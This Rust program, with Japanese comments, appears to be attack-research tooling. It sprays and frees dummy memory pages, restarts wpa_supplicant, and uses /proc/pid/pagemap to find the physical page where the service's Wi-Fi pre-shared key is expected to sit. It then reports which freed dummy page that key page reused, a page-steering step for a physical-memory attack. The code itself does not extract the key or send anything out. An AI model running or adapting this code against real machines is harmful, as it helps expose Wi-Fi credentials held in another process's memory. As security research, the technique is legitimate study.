use std::process::{Command, id};
use std::ptr::null_mut;
use std::{fs::File, io::{Read, Seek, SeekFrom}, mem::size_of};
use pagemap::maps;
use libc::{c_void, mmap, munmap, sched_yield, sleep, sysconf, _SC_PAGESIZE};

const DUMMY_PAGES: usize = 1500;

fn main() {
    let service_name = "wpa_supplicant";

    // dummy page を確保
    let mut dummy_pages: Vec<(*mut c_void, u64)> = Vec::new();
    for _ in 0..DUMMY_PAGES {
        dummy_pages.push(allocate_dummy_pages());
    }
    
    for _ in 0..10 {
        unsafe { sched_yield(); }
    }

    // dummy page を解放
    release_dummy_pages(&dummy_pages);

    // wpa_supplicant を起動 起動後少し待機
    restart_service(service_name);
    unsafe { sleep(3); }

    let pid = get_pid(service_name);
    println!("[+] pid = {}", pid);

    // wpa_supplicant の heap 領域の先頭アドレス
    let base_addr = get_heap_start_address(pid);
    println!("[+] base_addr = {:x}", base_addr);

    // PSK は base_addr から 0xc ページ後ろに置かれることが多い
    let psk_addr = (base_addr + 0xc000) as *const c_void;
    println!("[+] psk_addr = {:p}", psk_addr);

    // PSK が配置されたページの物理ページ番号を計算
    let page_frame_number = v2p(pid, psk_addr) as u64;
    println!("[+] page_frame_number = {:x}", page_frame_number);

    // for p in &dummy_pages {
    //     println!("[+] 0x{:x}", p.1);
    // }

    calc_dummy_page(&dummy_pages, page_frame_number);

}

fn restart_service(service_name: &str) {
    let status = Command::new("systemctl").arg("restart").arg(service_name).status().expect("failed to execute systemctl");
    if !status.success() {
        panic!("[-] failed to start {}", service_name);
    }
    println!("[+] start {}", service_name);
}

fn get_pid(service_name: &str) -> u64 {
    let mut pid: u64 = 0;
    let output = Command::new("systemctl")
    .arg("status")
    .arg(service_name)
    .output()
    .expect("failed to execute systemctl");
    for line in String::from_utf8(output.stdout).unwrap().lines() {
        if line.contains("PID") {
            pid = line.chars().filter(|c| c.is_ascii_digit()).collect::<String>().parse().unwrap();
        }
    }
    pid
}

fn get_heap_start_address(pid: u64) -> u64 {
    let map = maps(pid).unwrap();
    let mut res = 0;
    for m in map {
        if m.path() == Some("[heap]") {
            res = m.memory_region().start_address();
        }
    }
    res
}

fn v2p(pid: u64, virt_addr: *const c_void) -> usize {
    // ページサイズを計算 (基本 4KiB)
    let page_size = match unsafe { sysconf(_SC_PAGESIZE) } {
        -1 => 4096,
        sz => sz as u64,
    };

    // 仮想アドレスのページ番号を計算
    let virt_pfn = virt_addr as u64 / page_size;

    // 仮想アドレスのページ内オフセットを計算
    let offset = virt_addr as u64 % page_size;

    // 物理ページ番号 (55bit) を格納するバッファ
    let mut buff = [0; 8];

    let page_map_path = format!("/proc/{}/pagemap", pid);
    let mut file = File::open(page_map_path).unwrap();
    
    // 仮想アドレスページ番号の分だけカーソルを進める
    file.seek(SeekFrom::Start(size_of::<u64>() as u64 * virt_pfn)).unwrap();

    // 8x8=64bit 取得
    file.read_exact(&mut buff).unwrap();

    // 物理ページ番号を計算
    let mut pfn = 0;
    for (index, val) in buff.iter().enumerate() {
        pfn += (*val as usize) << (index * 8); 
    }

    match pfn & 0x7fffffffffffff {
        0 => 0,
        p => p * page_size as usize + offset as usize,
    }
}

fn allocate_dummy_pages() -> (*mut c_void, u64) {
    let pid = id() as u64;
    let mem: *mut c_void = unsafe {
        mmap(
            null_mut(),
            0x1000,
            libc::PROT_READ | libc::PROT_WRITE,
            libc::MAP_ANONYMOUS | libc::MAP_PRIVATE | libc::MAP_POPULATE,
            -1,
            0
        )
    };
    let physical_address = v2p(pid, mem) as u64;
    (mem, physical_address)
}

fn release_dummy_pages(dummy_pages: &[(*mut c_void, u64)]) {
    for page in dummy_pages {
        unsafe {
            munmap(page.0, 0x1000);
        }
    }
}

fn calc_dummy_page(dummy_pages: &[(*mut c_void, u64)], pfn: u64) {
    for (index, p) in dummy_pages.iter().enumerate() {
        if p.1 == pfn {
            println!("[+] found dummy page at dummy_pages[{}]", index);
            println!("[+] so, dummy page = {}", DUMMY_PAGES - index - 1);
            break;
        }
    }
}
